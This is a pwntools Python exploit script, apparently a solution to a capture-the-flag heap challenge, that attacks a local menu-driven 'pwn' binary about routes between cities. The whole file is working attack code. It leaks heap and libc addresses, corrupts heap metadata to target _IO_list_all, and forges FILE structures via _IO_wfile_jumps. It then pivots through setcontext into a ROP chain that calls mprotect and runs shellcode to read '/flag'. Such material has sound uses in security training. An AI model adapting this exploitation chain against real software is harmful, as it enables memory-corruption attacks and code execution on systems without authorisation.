from pwn import *
import tty
context(arch='amd64', os='linux', log_level='debug')

cities=[b"guangzhou",b"nanning",b"changsha",b"nanchang",b"fuzhou"]

s=process('./pwn')
libc=ELF("./libc.so.6")
def menu(ch):
    s.sendlineafter(b"distance.\n",str(ch).encode())

def add(size,idfrom,idto,dist=1000,note=b"/bin/sh\x00"):
    menu(1)
    if size==0x510:
        trans_type=b"car"
    elif size==0x520:
        trans_type=b"train"
    elif size==0x530:
        trans_type=b"plane"
    else:
        print("Invalid size")
        exit(-1)
    s.sendlineafter(b"plane?\n",trans_type)
    s.sendlineafter(b"where?\n",cities[idfrom])
    s.sendlineafter(b"where?\n",cities[idto])
    s.sendlineafter(b"far?\n",str(dist).encode())
    if note==b"": note=chr(tty.CEOF).encode()
    s.sendafter(b"Note:\n",note)

def delete(idfrom,idto):
    menu(2)
    s.sendlineafter(b"where?\n",cities[idfrom])
    s.sendlineafter(b"where?\n",cities[idto])

def show(idfrom,idto):
    menu(3)
    s.sendlineafter(b"where?\n",cities[idfrom])
    s.sendlineafter(b"where?\n",cities[idto])
    s.recvuntil(b"Distance:")
    distance=int(s.recvline().strip())
    s.recvuntil(b"Note:")
    note=s.recvline().strip()
    return distance,note

def edit(idfrom,idto,dist,note):
    menu(4)
    s.sendlineafter(b"where?\n",cities[idfrom])
    s.sendlineafter(b"where?\n",cities[idto])
    s.sendlineafter(b"change?\n",b"0")
    s.sendlineafter(b"far?\n",str(dist).encode())
    s.sendafter(b"Note:\n",note)

def calc(idto):
    menu(5)
    s.sendlineafter(b"name\n",cities[idto])

if __name__=="__main__":
    pause()
    add(0x510,0,1)
    add(0x530,1,2)
    add(0x520,2,2)
    add(0x510,2,3)
    add(0x530,3,4)
    add(0x520,3,3)
    calc(4)
    
    delete(1,2)
    delete(0,1)

    add(0x530,1,2,1000,b"a")
    _,dat=show(1,2)
    heap_base=u64(dat.ljust(8,b"\x00"))-0x61+0x70-0x1470
    success(hex(heap_base))
    delete(1,2)
    
    add(0x530,1,2,1000,b"A"*0x510)
    _,dat=show(1,2)
    libc.address=u64(dat[-6:].ljust(8,b"\x00"))-0x7f6391164ce0+0x7f6390f4b000-0x1000
    success(hex(libc.address))
    pause()
    add(0x510,0,1)

    delete(1,2)
    add(0x530,1,2,1000,flat([
        b"A"*0x508,0x14d1,
        p32(0),p32(4),p32(123),p32(0)
    ]))
    delete(0,1)
    add(0x530,3,3)

    edit(4,0,0,flat([
        0,0x531,0,0,0,libc.sym._IO_list_all-0x20
    ]))
    delete(2,3)
    add(0x530,1,4)
    add(0x530,0,0,1,flat(0,0x521,heap_base+0x2400,libc.address+0x21a110,heap_base+0x2400,heap_base+0x2400))
    rdi=libc.address+0x000000000002a3e5
    rsi=libc.address+0x000000000002be51
    rdx_rbx=libc.address+0x00000000000904a9
    magic=libc.address+0x167420
    shellcode="""
        add rdi,0x2700
        xor rsi,rsi
        xor rdx,rdx
        mov rax,2
        mov r15,rdi
        syscall
        mov rdi,rax
        mov rsi,r15
        mov rdx,0x100
        mov rax,0
        syscall
        mov rdi,1
        mov rax,1
        syscall
        mov rax,60
        xor rdi,rdi
        syscall
    """
    delete(0,4)
    add(0x530,0,0)
    add(0x530,0,0)
    add(0x530,0,4,1000,flat({
        0x68-0x30:heap_base+0x2500,
        0xd8-0x30:libc.sym._IO_wfile_jumps,
        0xa0-0x30:heap_base+0x2400+0x100,
        0x100-0x30:flat({
            0:0,
            8:heap_base+0x2400+0x300,
            0x28:1,
            0xd8:libc.sym._IO_wfile_jumps,
            0xa0:heap_base+0x2400+0x200,
        },filler=b"\x00",length=0x100),
        0x200-0x30:flat({
            0x18:0,
            0x30:0,
            0x38:heap_base+0x2400+0x300,
            0xe0:heap_base+0x2400+0x200,
            0x68:magic,
        },filler=b"\x00",length=0x100),
        0x300-0x30:flat({
            0:"/flag\x00",
            0x20:libc.sym.setcontext+61,
            0xa8:rdi+1,
            0xa0:heap_base+0x2400+0x400,
            0x100:flat([
                rdi,heap_base,
                rsi,0x20000,
                rdx_rbx,7,0,
                libc.sym.mprotect,
                heap_base+0x2400+0x400+0x48,
            ])+asm(shellcode)
        },filler=b"\x00"),
    },filler=b"\x00"))
    s.interactive()
